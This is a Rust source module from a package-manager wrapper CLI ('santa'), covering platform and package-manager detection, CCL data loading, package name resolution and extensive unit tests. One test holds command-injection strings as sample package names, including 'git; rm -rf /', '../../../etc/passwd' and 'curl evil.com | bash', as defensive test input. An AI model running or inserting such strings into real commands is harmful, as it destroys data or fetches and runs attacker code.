use crate::SantaConfig;
use std::{collections::HashMap, fs, path::Path};

use anyhow::Context;
use serde::{Deserialize, Serialize};
use tracing::{error, info};

use crate::{sources::PackageSource, traits::Exportable};

pub mod loaders;
pub mod schemas;

#[cfg(test)]
mod integration_tests;

pub mod constants;

// Re-export core data models from santa-data
pub use santa_data::{
    Arch, CommandName, Distro, KnownSources, PackageData, PackageDataList, PackageName, Platform,
    SourceName, OS,
};

/// Extension trait for Platform with santa-cli specific functionality
pub trait PlatformExt {
    fn current() -> Platform;
    fn detect_available_package_managers() -> Vec<KnownSources>;
    fn get_default_sources() -> Vec<KnownSources>;
    fn detect_linux_package_managers() -> Vec<KnownSources>;
}

impl PlatformExt for Platform {
    /// Get current platform using compile-time detection where possible
    fn current() -> Self {
        let mut platform = Platform::default();

        // Compile-time OS detection
        if cfg!(target_os = "windows") {
            platform.os = OS::Windows;
        } else if cfg!(target_os = "macos") {
            platform.os = OS::Macos;
        } else if cfg!(target_os = "linux") {
            platform.os = OS::Linux;
        } else {
            // Fallback to runtime detection for unknown platforms
            match std::env::consts::OS {
                "windows" => platform.os = OS::Windows,
                "macos" | "ios" => platform.os = OS::Macos,
                _ => platform.os = OS::Linux,
            }
        }

        // Compile-time architecture detection
        if cfg!(target_arch = "x86_64") {
            platform.arch = Arch::X64;
        } else if cfg!(target_arch = "aarch64") {
            platform.arch = Arch::Aarch64;
        } else {
            // Fallback to runtime detection
            match std::env::consts::ARCH {
                "x86_64" => platform.arch = Arch::X64,
                "aarch64" => platform.arch = Arch::Aarch64,
                _ => panic!("Unsupported architecture: {}", std::env::consts::ARCH),
            }
        }

        platform
    }

    /// Detect available package managers on the current system
    fn detect_available_package_managers() -> Vec<KnownSources> {
        let mut sources = Vec::new();

        if cfg!(target_os = "macos") {
            if which::which("brew").is_ok() {
                sources.push(KnownSources::Brew);
            }
        } else if cfg!(target_os = "linux") {
            // Check common Linux package managers
            if which::which("apt").is_ok() {
                sources.push(KnownSources::Apt);
            }
            if which::which("pacman").is_ok() {
                sources.push(KnownSources::Pacman);
            }
            if which::which("yay").is_ok() {
                sources.push(KnownSources::Aur);
            }
        } else if cfg!(target_os = "windows") && which::which("scoop").is_ok() {
            sources.push(KnownSources::Scoop);
        }

        // Universal package managers (available on multiple platforms)
        if which::which("cargo").is_ok() {
            sources.push(KnownSources::Cargo);
        }
        if which::which("nix").is_ok() || which::which("nix-env").is_ok() {
            sources.push(KnownSources::Nix);
        }

        sources
    }

    /// Get default package sources for the current platform
    fn get_default_sources() -> Vec<KnownSources> {
        if cfg!(target_os = "macos") {
            vec![KnownSources::Brew, KnownSources::Cargo]
        } else if cfg!(target_os = "linux") {
            // Use runtime detection for accuracy in containerized environments
            Self::detect_linux_package_managers()
        } else if cfg!(target_os = "windows") {
            vec![KnownSources::Scoop, KnownSources::Cargo]
        } else {
            vec![KnownSources::Cargo] // Fallback to universal package manager
        }
    }

    /// Detect Linux package managers with runtime checks
    fn detect_linux_package_managers() -> Vec<KnownSources> {
        let mut sources = Vec::new();

        // Check for actual package manager presence
        if which::which("apt").is_ok() {
            sources.push(KnownSources::Apt);
        }
        if which::which("pacman").is_ok() {
            sources.push(KnownSources::Pacman);
        }
        if which::which("yay").is_ok() {
            sources.push(KnownSources::Aur);
        }

        // Always add cargo as it's commonly available
        sources.push(KnownSources::Cargo);

        // Fallback to apt if no package manager detected
        if sources.is_empty() {
            sources.push(KnownSources::Apt);
        }

        sources
    }
}

pub trait LoadFromFile {
    fn load_from(file: &Path) -> Self
    where
        Self: Sized,
    {
        info!("Loading data from: {}", file.display());
        if !file.exists() {
            error!("Can't find data file: {}", file.display());
        }
        let yaml_str = fs::read_to_string(file)
            .with_context(|| format!("Failed to read file: {}", file.display()))
            .expect("Failed to read data file");
        LoadFromFile::load_from_str(&yaml_str)
    }

    fn load_from_str(yaml_str: &str) -> Self
    where
        Self: Sized;
}

/// Type alias for mapping source names to package sources
pub type SourceMap = HashMap<SourceName, PackageSource>;

impl LoadFromFile for PackageDataList {
    fn load_from_str(config_str: &str) -> Self {
        match serde_ccl::from_str(config_str) {
            Ok(data) => data,
            Err(e) => {
                error!("Error parsing CCL data: {}", e);
                error!("Using default empty data");
                PackageDataList::new()
            }
        }
    }
}

impl Exportable for PackageDataList {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        let list: Vec<String> = self.keys().map(|key| key.to_string()).collect();

        serde_json::to_string_pretty(&list).expect("Failed to serialize list")
    }
}

pub type SourceList = Vec<PackageSource>;

impl LoadFromFile for SourceList {
    fn load_from_str(config_str: &str) -> Self {
        serde_ccl::from_str(config_str).expect("Failed to load CCL source list")
    }
}

impl Exportable for SourceList {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        let list: Vec<String> = self.iter().map(|source| format!("{source}")).collect();

        serde_json::to_string_pretty(&list).expect("Failed to serialize source list")
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SantaData {
    pub packages: PackageDataList,
    pub sources: SourceList,
}

impl SantaData {
    pub fn load_from_str(packages_str: &str, sources_str: &str) -> Self {
        // Use the new schema loaders and convert to legacy format
        use crate::data::loaders::{convert_to_legacy_packages, convert_to_legacy_sources};

        // Parse using our custom santa-data parser that handles both simple and complex formats
        let schema_packages =
            santa_data::parse_ccl_to(packages_str).expect("Failed to load packages CCL");

        let schema_sources = serde_ccl::from_str(sources_str).expect("Failed to load sources CCL");

        // Convert to legacy format
        let packages = convert_to_legacy_packages(schema_packages);
        let sources = convert_to_legacy_sources(schema_sources);

        SantaData { packages, sources }
    }

    // pub fn update_from_config(&mut self, config: &SantaConfig) {

    /// Returns an iterator over sources (both built-in and custom) for memory efficiency.
    /// Use this when you only need to iterate over sources without owning them.
    pub fn sources_iter<'a>(
        &'a self,
        config: &'a SantaConfig,
    ) -> impl Iterator<Item = &'a PackageSource> + 'a {
        self.sources.iter().chain(
            config
                .custom_sources
                .as_ref()
                .map(|sources| sources.iter())
                .unwrap_or([].iter()),
        )
    }

    /// Returns owned sources list. Use only when you need to own/modify the collection.
    /// For read-only iteration, prefer sources_iter() for better performance.
    pub fn sources(&self, config: &SantaConfig) -> SourceList {
        let capacity =
            self.sources.len() + config.custom_sources.as_ref().map(|s| s.len()).unwrap_or(0);
        let mut ret = SourceList::with_capacity(capacity);
        ret.extend(self.sources.iter().cloned());
        if let Some(ref custom_sources) = config.custom_sources {
            ret.extend(custom_sources.iter().cloned());
        }
        ret
    }

    pub fn name_for(&self, package: &str, source: &PackageSource) -> String {
        match self.packages.get(package) {
            #[allow(clippy::collapsible_match)]
            Some(sources) => match sources.get(source.name()) {
                Some(pkgs) => match pkgs {
                    Some(name) => name
                        .name
                        .as_ref()
                        .map(|s| s.to_string())
                        .unwrap_or_else(|| source.adjust_package_name(package)),
                    None => source.adjust_package_name(package),
                },
                None => source.adjust_package_name(package),
            },
            None => source.adjust_package_name(package),
        }
    }
}

impl Default for SantaData {
    fn default() -> Self {
        SantaData::load_from_str(constants::BUILTIN_PACKAGES, constants::BUILTIN_SOURCES)
    }
}

impl Exportable for SantaData {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        serde_json::to_string_pretty(&self).expect("Failed to serialize SantaData")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_known_sources_serialization() {
        // Test that KnownSources enum serializes correctly
        let sources = vec![
            KnownSources::Apt,
            KnownSources::Brew,
            KnownSources::Cargo,
            KnownSources::Unknown("custom".to_string()),
        ];

        for source in sources {
            let serialized = serde_yaml::to_string(&source).unwrap();
            let deserialized: KnownSources = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(source, deserialized);
        }
    }

    #[test]
    fn test_platform_current_detection() {
        let platform = Platform::current();

        // Basic sanity checks - these should always pass
        assert!(matches!(platform.os, OS::Linux | OS::Macos | OS::Windows));
        assert!(matches!(platform.arch, Arch::X64 | Arch::Aarch64));

        // Test platform display
        let display_str = format!("{platform}");
        assert!(!display_str.is_empty());

        // Test that current platform detection is consistent
        let platform2 = Platform::current();
        assert_eq!(platform.os, platform2.os);
        assert_eq!(platform.arch, platform2.arch);
    }

    #[test]
    fn test_platform_display() {
        let platform_with_distro = Platform {
            os: OS::Linux,
            arch: Arch::X64,
            distro: Some(Distro::Ubuntu),
        };

        let platform_without_distro = Platform {
            os: OS::Macos,
            arch: Arch::Aarch64,
            distro: None,
        };

        let display_with = format!("{platform_with_distro}");
        let display_without = format!("{platform_without_distro}");

        assert!(display_with.contains("Linux"));
        assert!(display_with.contains("X64"));
        assert!(display_with.contains("Ubuntu"));

        assert!(display_without.contains("Macos"));
        assert!(display_without.contains("Aarch64"));
        assert!(!display_without.contains("Ubuntu"));
    }

    #[test]
    fn test_package_data_creation() {
        let pkg_data = PackageData::new("git");
        assert_eq!(pkg_data.name, Some("git".to_string()));
        assert!(pkg_data.before.is_none());
        assert!(pkg_data.after.is_none());
        assert!(pkg_data.pre.is_none());
        assert!(pkg_data.post.is_none());
    }

    #[test]
    fn test_santa_data_name_for() {
        // Create test data
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        git_sources.insert(KnownSources::Apt, None);
        packages.insert("git".to_string(), git_sources);

        let sources = SourceList::new();
        let data = SantaData { packages, sources };

        // Create test source
        let brew_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix.".to_string()),
            None,
        );

        // Test name resolution
        let name = data.name_for("git", &brew_source);
        assert_eq!(name, "git"); // Should use the stored name, not the adjusted one

        // Test with non-existent package
        let name_missing = data.name_for("nonexistent", &brew_source);
        assert_eq!(name_missing, "prefix.nonexistent"); // Should use source's adjust_package_name
    }

    #[test]
    fn test_package_data_list_serialization() {
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        packages.insert("git".to_string(), git_sources);

        // Test export_min functionality
        let exported = packages.export_min();
        assert!(exported.contains("git"));

        // Should be a YAML list of package names
        let deserialized: Vec<String> = serde_yaml::from_str(&exported).unwrap();
        assert!(deserialized.contains(&"git".to_string()));
    }

    #[test]
    fn test_santa_data_default() {
        let data = SantaData::default();

        // Default data should have some packages and sources
        assert!(!data.packages.is_empty());
        assert!(!data.sources.is_empty());

        // Should be able to export
        let exported = data.export();
        assert!(!exported.is_empty());
    }

    #[test]
    fn test_load_from_file_error_handling() {
        // Test error handling in LoadFromFile trait
        let invalid_yaml = "invalid: yaml: content: [";

        // This should return empty data on error to prevent recursion
        let result = PackageDataList::load_from_str(invalid_yaml);
        assert!(result.is_empty()); // Should return empty data on error
    }

    #[test]
    fn test_security_package_names() {
        // Test that various dangerous package names are handled
        let dangerous_names = vec![
            "git; rm -rf /",
            "$(evil_command)",
            "`dangerous`",
            "../../../etc/passwd",
            "package && curl evil.com | bash",
        ];

        let mut packages = PackageDataList::new();
        for name in &dangerous_names {
            let mut sources = HashMap::new();
            sources.insert(KnownSources::Brew, Some(PackageData::new(name)));
            packages.insert(name.to_string(), sources);
        }

        let data = SantaData {
            packages,
            sources: SourceList::new(),
        };

        // Test that package names are preserved (they should be sanitized during execution)
        for name in &dangerous_names {
            assert!(data.packages.contains_key(*name));
        }

        // Test export with dangerous names
        let exported = data.export();
        assert!(!exported.is_empty());

        // Test name_for with dangerous source
        let source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew; rm -rf /",
            "brew install",
            "brew list",
            None,
            None,
        );

        for name in &dangerous_names {
            let resolved = data.name_for(name, &source);
            // Should return the name as-is - sanitization should happen at execution time
            assert!(!resolved.is_empty());
        }
    }

    #[test]
    fn test_platform_detect_available_package_managers() {
        let detected = Platform::detect_available_package_managers();

        // Should always return a vector (empty or with sources)
        assert!(detected.len() <= 10); // Reasonable upper bound

        // All returned sources should be valid enum variants
        for source in &detected {
            match source {
                KnownSources::Apt
                | KnownSources::Brew
                | KnownSources::Cargo
                | KnownSources::Pacman
                | KnownSources::Aur
                | KnownSources::Scoop
                | KnownSources::Nix => {
                    // Valid known sources
                }
                KnownSources::Unknown(_) => {
                    panic!("detect_available_package_managers should only return known sources")
                }
            }
        }

        // Test that the function is deterministic (same results on repeated calls)
        let detected_again = Platform::detect_available_package_managers();
        assert_eq!(detected, detected_again);
    }

    #[test]
    fn test_platform_get_default_sources() {
        let defaults = Platform::get_default_sources();

        // Should always return at least one source
        assert!(!defaults.is_empty());

        // Should include Cargo on all platforms as a universal package manager
        assert!(defaults.contains(&KnownSources::Cargo));

        // Test platform-specific defaults (compile-time detection)
        if cfg!(target_os = "macos") {
            assert!(defaults.contains(&KnownSources::Brew));
        } else if cfg!(target_os = "windows") {
            assert!(defaults.contains(&KnownSources::Scoop));
        } else if cfg!(target_os = "linux") {
            // Linux should have at least one Linux package manager
            let has_linux_pm = defaults.iter().any(|s| {
                matches!(
                    s,
                    KnownSources::Apt | KnownSources::Pacman | KnownSources::Aur
                )
            });
            assert!(has_linux_pm);
        }

        // All sources should be known (not Unknown variants)
        for source in &defaults {
            assert!(!matches!(source, KnownSources::Unknown(_)));
        }
    }

    #[test]
    fn test_platform_detect_linux_package_managers() {
        // Note: This function is private, but we can test it through get_default_sources
        // when running on Linux
        if cfg!(target_os = "linux") {
            let defaults = Platform::get_default_sources();

            // Should contain at least Cargo
            assert!(defaults.contains(&KnownSources::Cargo));

            // Should have at least one Linux-specific package manager
            let linux_managers = defaults
                .iter()
                .filter(|&s| {
                    matches!(
                        s,
                        KnownSources::Apt | KnownSources::Pacman | KnownSources::Aur
                    )
                })
                .count();

            // Even if no Linux package managers are detected, should fall back to apt
            assert!(linux_managers >= 1 || defaults.contains(&KnownSources::Apt));
        }
    }

    #[test]
    fn test_santa_data_sources_filtering() {
        use crate::SantaConfig;

        // Create test data with some sources
        let test_sources = vec![
            crate::sources::PackageSource::new_for_test(
                KnownSources::Brew,
                "🍺",
                "brew",
                "brew install",
                "brew list",
                None,
                None,
            ),
            crate::sources::PackageSource::new_for_test(
                KnownSources::Apt,
                "📦",
                "apt",
                "apt install",
                "apt list",
                None,
                None,
            ),
        ];

        let data = SantaData {
            packages: PackageDataList::new(),
            sources: test_sources.clone(),
        };

        // Test with empty config (should return all sources)
        let empty_config = SantaConfig {
            sources: vec![],
            ..Default::default()
        };

        let filtered_empty = data.sources(&empty_config);
        assert_eq!(filtered_empty.len(), 2);

        // Test with config containing custom sources (should extend with custom sources)
        let config_with_custom_sources = SantaConfig {
            custom_sources: Some(vec![crate::sources::PackageSource::new_for_test(
                KnownSources::Cargo,
                "📦",
                "cargo",
                "cargo install",
                "cargo search",
                None,
                None,
            )]),
            ..Default::default()
        };

        let filtered_with_custom = data.sources(&config_with_custom_sources);
        // Should be 2 original + 1 custom = 3
        assert_eq!(filtered_with_custom.len(), 3);

        // Test with no custom sources (should return original sources only)
        let config_no_custom = SantaConfig {
            custom_sources: None,
            ..Default::default()
        };

        let filtered_no_custom = data.sources(&config_no_custom);
        assert_eq!(filtered_no_custom.len(), 2);
    }

    #[test]
    fn test_load_from_file_actual_files() {
        use std::io::Write;
        use tempfile::NamedTempFile;

        // Test successful file loading
        let valid_ccl = r#"
git =
  brew =
    name = git
    before = echo before
    after = echo after
"#;

        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(valid_ccl.as_bytes()).unwrap();
        temp_file.flush().unwrap();

        let loaded_data = PackageDataList::load_from(temp_file.path());
        assert!(loaded_data.contains_key("git"));

        let git_data = &loaded_data["git"];
        assert!(git_data.contains_key(&KnownSources::Brew));

        if let Some(Some(pkg_data)) = git_data.get(&KnownSources::Brew) {
            assert_eq!(pkg_data.name, Some("git".to_string()));
            assert_eq!(pkg_data.before, Some("echo before".to_string()));
            assert_eq!(pkg_data.after, Some("echo after".to_string()));
        } else {
            panic!("Expected PackageData for git/brew");
        }

        // Note: SourceList is Vec<PackageSource> which needs array format in CCL
        // However, the actual application uses schema-based loading with HashMap
        // For this test, we'll just verify that PackageDataList loading works
        // SourceList loading is tested via schema-based loading in integration tests
    }

    #[test]
    fn test_data_transformation_round_trip() {
        // Test full serialization/deserialization cycle
        let original_data = SantaData::default();

        // Export to string (exports as JSON)
        let exported = original_data.export_min();
        assert!(!exported.is_empty());

        // Should be valid JSON
        let _: SantaData = serde_json::from_str(&exported).unwrap();

        // Test PackageDataList round trip (exports as JSON)
        let packages = original_data.packages;
        let packages_exported = packages.export_min();
        let packages_list: Vec<String> = serde_json::from_str(&packages_exported).unwrap();
        assert!(!packages_list.is_empty());

        // Test SourceList round trip (exports as JSON)
        let sources = original_data.sources;
        let sources_exported = sources.export_min();
        let sources_list: Vec<String> = serde_json::from_str(&sources_exported).unwrap();
        assert!(!sources_list.is_empty());
    }

    #[test]
    fn test_strong_typing_newtypes() {
        // Test that strong types work correctly
        let package_name = PackageName::from("git".to_string());
        let source_name = SourceName::from("brew".to_string());
        let command_name = CommandName::from("install".to_string());

        // Test Display trait
        assert_eq!(format!("{package_name}"), "git");
        assert_eq!(format!("{source_name}"), "brew");
        assert_eq!(format!("{command_name}"), "install");

        // Test Into/From traits
        let pkg_string: String = package_name.into();
        assert_eq!(pkg_string, "git");

        let new_pkg = PackageName::from("vim".to_string());
        assert_ne!(new_pkg, PackageName::from("git".to_string()));

        // Test serialization
        let serialized = serde_yaml::to_string(&new_pkg).unwrap();
        let deserialized: PackageName = serde_yaml::from_str(&serialized).unwrap();
        assert_eq!(new_pkg, deserialized);
    }

    #[test]
    fn test_os_arch_distro_enums() {
        // Test enum variants exist and serialize correctly
        let os_variants = vec![OS::Linux, OS::Macos, OS::Windows];
        let arch_variants = vec![Arch::X64, Arch::Aarch64];
        let distro_variants = vec![Distro::None, Distro::ArchLinux, Distro::Ubuntu];

        for os in os_variants {
            let serialized = serde_yaml::to_string(&os).unwrap();
            let deserialized: OS = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(os, deserialized);
        }

        for arch in arch_variants {
            let serialized = serde_yaml::to_string(&arch).unwrap();
            let deserialized: Arch = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(arch, deserialized);
        }

        for distro in distro_variants {
            let serialized = serde_yaml::to_string(&distro).unwrap();
            let deserialized: Distro = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(distro, deserialized);
        }
    }

    #[test]
    fn test_platform_with_all_combinations() {
        // Test various platform combinations
        let platforms = vec![
            Platform {
                os: OS::Linux,
                arch: Arch::X64,
                distro: Some(Distro::Ubuntu),
            },
            Platform {
                os: OS::Linux,
                arch: Arch::Aarch64,
                distro: Some(Distro::ArchLinux),
            },
            Platform {
                os: OS::Macos,
                arch: Arch::X64,
                distro: None,
            },
            Platform {
                os: OS::Macos,
                arch: Arch::Aarch64,
                distro: None,
            },
            Platform {
                os: OS::Windows,
                arch: Arch::X64,
                distro: None,
            },
        ];

        for platform in platforms {
            // Test serialization
            let serialized = serde_yaml::to_string(&platform).unwrap();
            let deserialized: Platform = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(platform, deserialized);

            // Test display
            let display = format!("{platform}");
            assert!(!display.is_empty());

            // Display should contain OS and arch
            assert!(display.contains(&format!("{:?}", platform.os)));
            assert!(display.contains(&format!("{:?}", platform.arch)));

            // If distro is present, should be in display
            if let Some(ref distro) = platform.distro {
                assert!(display.contains(&format!("{distro:?}")));
            }
        }
    }

    #[test]
    fn test_platform_detect_package_managers_edge_cases() {
        // Test that detect function handles missing commands gracefully
        let detected = Platform::detect_available_package_managers();

        // Should never return duplicates
        let mut unique_sources = std::collections::HashSet::new();
        for source in &detected {
            assert!(
                unique_sources.insert(source.clone()),
                "Duplicate source detected: {source:?}"
            );
        }

        // Should be stable across multiple calls
        for _ in 0..5 {
            let detected_again = Platform::detect_available_package_managers();
            assert_eq!(detected, detected_again, "Detection should be stable");
        }

        // Each detected source should be appropriate for the current platform
        for source in &detected {
            match source {
                KnownSources::Brew => {
                    if !cfg!(target_os = "macos") {
                        // Brew can be installed on Linux too, so this is not an error
                        // but we should at least verify it was actually found
                    }
                }
                KnownSources::Apt | KnownSources::Pacman | KnownSources::Aur => {
                    // Linux package managers - could be available on other systems via containers
                }
                KnownSources::Scoop => {
                    // Windows package manager - could be available on other systems via WSL
                }
                KnownSources::Cargo | KnownSources::Nix => {
                    // Universal package managers - valid on all platforms
                }
                KnownSources::Unknown(_) => {
                    panic!("detect_available_package_managers returned Unknown variant");
                }
            }
        }
    }

    #[test]
    fn test_platform_default_sources_consistency() {
        let defaults = Platform::get_default_sources();
        let detected = Platform::detect_available_package_managers();

        // Default sources should include some actually available package managers
        // (but may include more that aren't available yet)
        let available_count = defaults
            .iter()
            .filter(|&source| detected.contains(source))
            .count();

        // At least one default source should be available (Cargo is universal)
        assert!(
            available_count >= 1,
            "At least one default source should be available. Defaults: {defaults:?}, Detected: {detected:?}"
        );

        // Should not contain Unknown variants in defaults
        for source in &defaults {
            assert!(
                !matches!(source, KnownSources::Unknown(_)),
                "Default sources should not contain Unknown variants"
            );
        }
    }

    #[test]
    fn test_santa_data_sources_with_empty_custom_sources() {
        use crate::SantaConfig;

        let test_sources = vec![crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            None,
            None,
        )];

        let data = SantaData {
            packages: PackageDataList::new(),
            sources: test_sources.clone(),
        };

        // Test with empty custom_sources vector (not None)
        let mut config = SantaConfig {
            custom_sources: Some(vec![]),
            ..Default::default()
        };

        let filtered = data.sources(&config);
        assert_eq!(
            filtered.len(),
            1,
            "Should return original sources when custom_sources is empty"
        );

        // Test with None custom_sources
        config.custom_sources = None;
        let filtered_none = data.sources(&config);
        assert_eq!(
            filtered_none.len(),
            1,
            "Should return original sources when custom_sources is None"
        );
    }

    #[test]
    fn test_santa_data_name_for_edge_cases() {
        let mut packages = PackageDataList::new();

        // Package with partial source data
        let mut git_sources = HashMap::new();
        git_sources.insert(
            KnownSources::Brew,
            Some(PackageData {
                name: None, // No name override
                before: Some("echo before".to_string()),
                after: None,
                pre: None,
                post: None,
            }),
        );
        git_sources.insert(KnownSources::Apt, None); // Source exists but no data
        packages.insert("git".to_string(), git_sources);

        // Package with name override
        let mut vim_sources = HashMap::new();
        vim_sources.insert(
            KnownSources::Brew,
            Some(PackageData {
                name: Some("vim-override".to_string()),
                before: None,
                after: None,
                pre: None,
                post: None,
            }),
        );
        packages.insert("vim".to_string(), vim_sources);

        let data = SantaData {
            packages,
            sources: SourceList::new(),
        };

        let brew_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix-".to_string()),
            None,
        );

        let apt_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Apt,
            "📦",
            "apt",
            "apt install",
            "apt list",
            None,
            None,
        );

        // Test git with brew (has PackageData but no name override)
        let git_brew_name = data.name_for("git", &brew_source);
        assert_eq!(
            git_brew_name, "prefix-git",
            "Should use source adjustment when no name override"
        );

        // Test git with apt (source exists but PackageData is None)
        let git_apt_name = data.name_for("git", &apt_source);
        assert_eq!(
            git_apt_name, "git",
            "Should use source adjustment when PackageData is None"
        );

        // Test vim with brew (has name override)
        let vim_brew_name = data.name_for("vim", &brew_source);
        assert_eq!(
            vim_brew_name, "vim-override",
            "Should use name override when provided"
        );

        // Test unknown package
        let unknown_name = data.name_for("unknown-package", &brew_source);
        assert_eq!(
            unknown_name, "prefix-unknown-package",
            "Should use source adjustment for unknown packages"
        );

        // Test with source not in package data
        let cargo_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Cargo,
            "📦",
            "cargo",
            "cargo install",
            "cargo search",
            None,
            None,
        );

        let git_cargo_name = data.name_for("git", &cargo_source);
        assert_eq!(
            git_cargo_name, "git",
            "Should use source adjustment when source not in package data"
        );
    }

    #[test]
    fn test_load_from_file_missing_file() {
        use std::path::PathBuf;

        // Test behavior when file doesn't exist
        let nonexistent_path = PathBuf::from("/tmp/nonexistent_santa_test_file_12345.yaml");
        assert!(!nonexistent_path.exists());

        // This should panic (expected behavior according to current implementation)
        // We use std::panic::catch_unwind to test panic behavior
        let result = std::panic::catch_unwind(|| PackageDataList::load_from(&nonexistent_path));

        assert!(result.is_err(), "Loading non-existent file should panic");
    }

    #[test]
    fn test_source_list_load_from_str_errors() {
        // Test various invalid CCL structures for SourceList
        let invalid_ccl = [
            "invalid: ccl: [structure",                    // Invalid CCL syntax
            "name = valid\nemoji = 🍺\ninvalid_structure", // Invalid structure
            "= null",                                      // Invalid CCL
        ];

        for ccl in invalid_ccl.iter() {
            let result = std::panic::catch_unwind(|| SourceList::load_from_str(ccl));
            // All invalid CCL should panic (current behavior)
            assert!(result.is_err(), "Invalid CCL should cause panic: {}", ccl);
        }

        // Empty string might parse as empty object - both panic and success are acceptable
        let empty_ccl = "";
        let _ = std::panic::catch_unwind(|| SourceList::load_from_str(empty_ccl));
    }

    #[test]
    fn test_package_data_list_export_with_complex_data() {
        let mut packages = PackageDataList::new();

        // Add packages with various Unicode characters and special names
        let test_packages = vec![
            "git",
            "🦀-rust-package",
            "package-with-dashes",
            "package_with_underscores",
            "123numeric-start",
            "CamelCasePackage",
        ];

        for pkg in &test_packages {
            let mut sources = HashMap::new();
            sources.insert(KnownSources::Brew, Some(PackageData::new(pkg)));
            packages.insert(pkg.to_string(), sources);
        }

        let exported = packages.export_min();

        // Should be valid YAML
        let deserialized: Vec<String> = serde_yaml::from_str(&exported).unwrap();

        // All packages should be present
        for pkg in &test_packages {
            assert!(
                deserialized.contains(&pkg.to_string()),
                "Exported data should contain package: {pkg}"
            );
        }

        assert_eq!(deserialized.len(), test_packages.len());
    }

    #[test]
    fn test_known_sources_unknown_variant_handling() {
        // Test that Unknown variant works correctly
        let unknown_source = KnownSources::Unknown("custom-manager".to_string());

        // Test serialization
        let serialized = serde_yaml::to_string(&unknown_source).unwrap();
        assert!(serialized.contains("custom-manager"));

        // Test deserialization
        let deserialized: KnownSources = serde_yaml::from_str(&serialized).unwrap();
        assert_eq!(unknown_source, deserialized);

        // Test that truly unknown strings deserialize to Unknown variant
        let unknown_yaml = "\"totally-unknown-package-manager\"";
        let parsed: KnownSources = serde_yaml::from_str(unknown_yaml).unwrap();
        assert!(matches!(parsed, KnownSources::Unknown(_)));

        if let KnownSources::Unknown(name) = parsed {
            assert_eq!(name, "totally-unknown-package-manager");
        }
    }
}
